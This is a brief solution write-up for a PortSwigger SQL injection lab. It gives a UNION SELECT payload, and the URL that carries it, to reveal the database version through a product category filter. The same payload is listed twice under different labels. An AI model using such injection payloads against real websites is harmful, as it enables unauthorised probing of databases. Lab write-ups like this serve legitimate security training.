# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft (Practitioner)

**PortSwigger:** [Official lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

**Description:** Use a UNION-based injection in the product filter to display the MySQL or Microsoft SQL Server version.

**Goal:** Display the database version string.

## Solution

**MySQL / Microsoft SQL Server:**

```
'+UNION+SELECT+'a',+@@version#
```

Or for Microsoft:

```
'+UNION+SELECT+'a',+@@version#
```

(Works on both in most labs.)

## Payload

```
/filter?category='+UNION+SELECT+'a',+@@version#
```
